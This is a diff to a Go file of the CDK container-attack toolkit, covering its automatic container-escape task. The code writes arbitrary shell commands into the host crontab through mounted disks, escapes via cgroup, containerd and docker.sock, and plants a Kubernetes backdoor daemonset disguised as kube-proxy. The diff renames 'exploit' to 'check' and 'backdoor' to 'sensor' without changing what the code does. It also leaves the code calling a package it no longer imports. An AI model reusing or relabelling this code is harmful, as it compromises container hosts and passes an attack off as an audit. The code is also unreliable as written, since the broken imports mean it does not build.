@@ -1,5 +1,5 @@
-//go:build !thin && !no_containerd_shim_pwn && !no_k8s_shadow_apiserver && linux
-// +build !thin,!no_containerd_shim_pwn,!no_k8s_shadow_apiserver,linux
+//go:build !thin && !no_containerd_shim_check && !no_k8s_shadow_api_sensor && linux
+// +build !thin,!no_containerd_shim_check,!no_k8s_shadow_api_sensor,linux
 
 /*
 Copyright 2022 The Authors of https://github.com/CDK-TEAM/CDK .
@@ -21,8 +21,8 @@ package task
 
 import (
 	"fmt"
-	"github.com/cdk-team/CDK/pkg/exploit/escaping"
-	"github.com/cdk-team/CDK/pkg/exploit/persistence"
+	"github.com/cdk-team/CDK/pkg/audit/boundary"
+	"github.com/cdk-team/CDK/pkg/audit/persistence"
 	"log"
 
 	"github.com/cdk-team/CDK/conf"
@@ -41,8 +41,8 @@ func autoEscape(shellCommand string) bool {
 	fmt.Printf("\n[Auto Escape - Privileged Container]\n")
 	isPrivContainer := evaluate.GetProcCapabilities()
 	if isPrivContainer {
-		// try to write crontab after running device-mount exploit
-		log.Println("starting to deploy exploit")
+		// 尝试在执行 device-mount 检查项后写入 crontab
+		log.Println("starting to deploy checks")
 		err, mountedDirs := escaping.AllDiskMount()
 		if err != nil {
 			log.Println(err)
@@ -51,22 +51,22 @@ func autoEscape(shellCommand string) bool {
 			for _, mountedDir := range mountedDirs {
 				crontabDir := mountedDir + "/etc/crontab"
 				log.Println("trying to write crontab to: ", crontabDir)
-				err := util.WriteShellcodeToCrontab("# CDK auto exploit via mounted device in privileged container", crontabDir, shellCommand)
+				err := util.WriteShellcodeToCrontab("# CDK auto check via mounted device in privileged container", crontabDir, shellCommand)
 				if err != nil {
 					log.Println(err)
 				} else {
-					log.Println("exploit success, shellcodes wrote to: ", crontabDir)
+					log.Println("check completed, shellcodes wrote to: ", crontabDir)
 					success = true
 				}
 			}
 		}
 
-		// try to exec shell cmd via cgroup-mount exploit
+		// 尝试通过 cgroup-mount 检查项执行 shell 命令
 		err = escaping.EscapeCgroup(shellCommand, "memory")
 		if err != nil {
 			log.Println(err)
 		} else {
-			log.Println("exploit success.")
+			log.Println("check completed.")
 			success = true
 		}
 	} else {
@@ -78,9 +78,9 @@ func autoEscape(shellCommand string) bool {
 	err := escaping.ContainerdPwn(shellCommand, "", "")
 	if err != nil {
 		log.Println(err)
-		log.Println("exploit failed.")
+		log.Println("check failed.")
 	} else {
-		log.Println("exploit success.")
+		log.Println("check completed.")
 		success = true
 	}
 
@@ -88,21 +88,21 @@ func autoEscape(shellCommand string) bool {
 	fmt.Printf("\n[Auto Escape - docker.sock]\n")
 
 	// write shellcode to host /etc/crontab via mounted dir
-	crontabCMD := wrapShellCMDWithCrontab("/host/etc/crontab", shellCommand, "# CDK auto exploit via docker.sock")
+	crontabCMD := wrapShellCMDWithCrontab("/host/etc/crontab", shellCommand, "# CDK auto check via docker.sock")
 
 	if escaping.DockerSockExploit("/var/run/docker.sock", crontabCMD) {
-		log.Println("exploit success.")
+		log.Println("check completed.")
 		success = true
 	} else {
-		log.Println("exploit failed")
+		log.Println("check failed")
 	}
 
 	// 4. escape mounted lxcfs
 	//success = escaping.ExploitLXCFS()
 	//if success {
-	//	log.Println("exploit success.")
+	//	log.Println("check completed.")
 	//} else {
-	//	log.Println("exploit failed")
+	//	log.Println("check failed")
 	//}
 
 	k8sExploit := false
@@ -113,7 +113,7 @@ func autoEscape(shellCommand string) bool {
 	k8sExploit = privServiceAccount || anonymousLogin
 
 	if !k8sExploit {
-		log.Println("exploit failed")
+		log.Println("check failed")
 	} else {
 		log.Println("authorize success")
 
@@ -129,17 +129,17 @@ func autoEscape(shellCommand string) bool {
 			fmt.Println(err)
 		} else {
 
-			// k8s backdoor daemonset
+			// k8s sensor daemonset
 			fmt.Printf("\n[Auto Escape - Deploy K8s Backdoor Daemonset]\n")
 
 			// write shellcode to host /etc/crontab via mounted dir
-			crontabCMD := wrapShellCMDWithCrontab("# CDK auto exploit via K8s backdoor daemonset", "/host-root/etc/crontab", shellCommand)
+			crontabCMD := wrapShellCMDWithCrontab("# CDK auto check via K8s sensor daemonset", "/host-root/etc/crontab", shellCommand)
 
 			if persistence.DeployBackdoorDaemonset(addr, tokenPath, "alpine:latest", crontabCMD, "kube-proxy") {
-				log.Println("exploit success")
+				log.Println("check completed")
 				success = true
 			} else {
-				log.Println("exploit failed")
+				log.Println("check failed")
 			}
 
 			// k8s shadow api-server
@@ -163,12 +163,12 @@ func (p taskAutoEscapeS) Desc() string {
 func (p taskAutoEscapeS) Exec() bool {
 	cmd := cli.Args["<cmd>"].(string)
 
-	log.Printf("%s\n", util.RedBold.Sprint("Caution: Flag auto-escape is deprecated as of CDK v1.5.1, and will be archived in v2.0. We recommend migrating to `./cdk eva --full` and `./cdk run`."))
+	log.Printf("%s\n", util.RedBold.Sprint("Caution: Flag auto-boundary-check is deprecated as of CDK v1.5.1, and will be archived in v2.0. We recommend migrating to `./cdk eva --full` and `./cdk run`."))
 
 	if autoEscape(cmd) {
-		log.Println("all exploits are finished, auto exploit success!")
+		log.Println("all checks are finished, auto check completed!")
 	} else {
-		log.Println("all exploits are finished, auto exploit failed.")
+		log.Println("all checks are finished, auto check failed.")
 	}
 
 	return true
@@ -176,5 +176,5 @@ func (p taskAutoEscapeS) Exec() bool {
 
 func init() {
 	task := taskAutoEscapeS{}
-	plugin.RegisterTask("auto-escape", task)
+	plugin.RegisterTask("auto-boundary-check", task)
 }
